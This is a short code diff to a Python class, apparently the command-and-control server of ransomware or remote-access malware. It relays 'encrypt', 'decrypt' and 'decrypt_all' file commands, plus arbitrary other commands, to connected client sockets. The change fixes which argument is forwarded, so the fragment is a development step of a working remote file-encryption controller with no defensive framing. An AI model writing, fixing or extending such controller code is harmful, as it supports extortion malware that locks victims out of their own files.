@@ -309,14 +309,14 @@ class MC:
 		# encrypt single file
 		elif(nextCmd.startswith("encrypt ")):
 			if(len(nextCmd.split(' ')) > 2):
-				cls.sendTo(cls.socks[cls.choice], nextCmd.split(' ')[1])
+				cls.sendTo(cls.socks[cls.choice], nextCmd.split(' ')[2])
 		# decrypt all data
 		elif(nextCmd.startswith('decrypt_all')):
 			cls.sendTo(cls.socks[cls.choice], nextCmd)
 		# decrypt single file
 		elif(nextCmd.startswith("decrypt ")):
 			if(len(nextCmd.split(' ')) > 2):
-				cls.sendTo(cls.socks[cls.choice], nextCmd.split(' ')[1])
+				cls.sendTo(cls.socks[cls.choice], nextCmd.split(' ')[2])
 		#	any oter strings / commands
 		elif(nextCmd != ''):
 			cls.sendTo(cls.socks[cls.choice], nextCmd)
